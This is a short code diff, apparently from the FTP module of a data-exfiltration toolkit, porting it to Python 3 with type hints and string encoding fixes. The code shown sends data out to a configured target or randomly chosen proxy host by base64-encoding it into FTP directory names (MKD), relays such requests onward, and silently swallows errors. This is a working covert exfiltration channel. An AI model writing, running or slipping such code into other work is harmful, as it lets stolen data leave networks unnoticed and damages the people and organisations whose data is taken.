@@ -26,7 +26,7 @@ class CustomFTPHandler(FTPHandler):
         self.respond('257 "%s" directory created.' % line.replace('"', '""'))
         return path
 
-def send(data):
+def send(data: str):
     if 'proxies' in config and config['proxies'] != [""]:
         targets = [config['target']] + config['proxies']
         target = choice(targets)
@@ -41,11 +41,11 @@ def send(data):
         pass
 
     try:
-        ftp.mkd(base64.b64encode(data))
+        ftp.mkd(base64.b64encode(data.encode()).decode())
     except:
         pass
 
-def relay_ftp_mkdir(data):
+def relay_ftp_mkdir(data: str):
     target = config['target']
     port = config['port']
     app_exfiltrate.log_message('info', "[proxy] [ftp] Relaying MKDIR query to {}".format(target))
@@ -55,6 +55,7 @@ def relay_ftp_mkdir(data):
         ftp.login(user, passwd)
     except:
         pass
+
     try:
         ftp.mkd(data)
     except:
